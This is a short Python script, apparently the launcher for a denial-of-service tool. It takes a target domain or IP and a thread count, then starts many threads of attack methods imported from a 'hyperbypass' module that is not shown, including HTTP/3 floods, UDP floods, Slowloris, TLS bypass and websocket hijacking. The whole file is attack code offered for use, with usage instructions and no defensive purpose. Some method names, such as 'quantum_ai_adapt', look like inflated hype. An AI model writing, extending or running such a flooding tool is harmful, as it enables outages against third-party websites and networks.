import threading
import sys
import time
from hyperbypass import QuantumDestruction

def attack(target, threads, attack_type):
    attack_instance = QuantumDestruction(target, attack_type)

    for _ in range(threads):
        threading.Thread(target=attack_instance.http3_flood).start()
        threading.Thread(target=attack_instance.tls_bypass).start()
        threading.Thread(target=attack_instance.websocket_hijack).start()
        threading.Thread(target=attack_instance.udp_apocalypse).start()
        threading.Thread(target=attack_instance.slowloris_stealth).start()
        threading.Thread(target=attack_instance.quantum_ai_adapt).start()

def main():
    if len(sys.argv) < 3:
        print("\nUsage:")
        print("  python main.py <target> <threads>")
        print("  python main.py -a <domain> <threads>")
        print("  python main.py -ip <IP> <threads>\n")
        sys.exit(1)

    if sys.argv[1] == "-a":
        target = sys.argv[2]
        attack_type = "HTTP"
        threads = int(sys.argv[3])
    elif sys.argv[1] == "-ip":
        target = sys.argv[2]
        attack_type = "IP"
        threads = int(sys.argv[3])
    else:
        target = sys.argv[1]
        attack_type = "HTTP"
        threads = int(sys.argv[2])

    print(f"[*] Starting attack on {target} with {threads} threads...")
    time.sleep(1)
    attack(target, threads, attack_type)

if __name__ == "__main__":
    main()
